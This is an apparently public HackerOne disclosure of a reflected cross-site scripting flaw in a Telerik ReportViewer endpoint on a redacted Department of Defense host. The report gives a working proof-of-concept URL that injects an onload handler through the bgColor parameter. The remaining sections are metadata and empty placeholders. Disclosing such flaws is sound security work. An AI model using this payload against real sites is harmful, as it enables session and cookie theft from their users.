---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1223575'
original_report_id: '1223575'
title: XSS Reflected - ███
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-06-11T04:11:34.073Z'
disclosed_at: '2022-04-07T19:50:53.134Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS Reflected - ███

## Metadata

- HackerOne Report ID: 1223575
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2022-04-07T19:50:53.134Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

I found a XSS Reflected.

```
https://██████/Telerik.ReportViewer.axd?optype=Parameters&bgColor=_000000%22onload=%22prompt(1)
```

Thans DRauschkolb

## Impact

XSS vulnerabilities can be used to trick a web user into executing a malicious script, potentially revealing a user's web session information or modify web content & even steal cookies.

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
https://█████/Telerik.ReportViewer.axd?optype=Parameters&bgColor=_000000%22onload=%22prompt(1)

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
